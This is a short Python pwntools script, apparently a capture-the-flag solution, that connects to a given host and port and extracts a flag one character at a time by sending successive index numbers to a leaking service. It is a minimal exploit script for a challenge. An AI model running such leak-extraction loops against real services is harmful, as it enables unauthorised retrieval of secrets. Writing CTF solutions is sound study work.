from pwn import *

if len(sys.argv) != 3:
    log.warn(f"Usage: {sys.argv[0]} HOST PORT")
    exit(1)

r = remote(sys.argv[1], sys.argv[2])
flag = ""
counter = 0
while "}" not in flag:
    r.sendlineafter(b"index: ", str(counter).encode())
    r.recvuntil(b"Index " + str(counter).encode() + b": ")
    flag_piece = r.recvline().strip().decode()
    log.info(f"Char at {str(counter)}: {flag_piece}")
    flag += flag_piece
    counter += 1
        
log.success(f"Flag: {flag}")
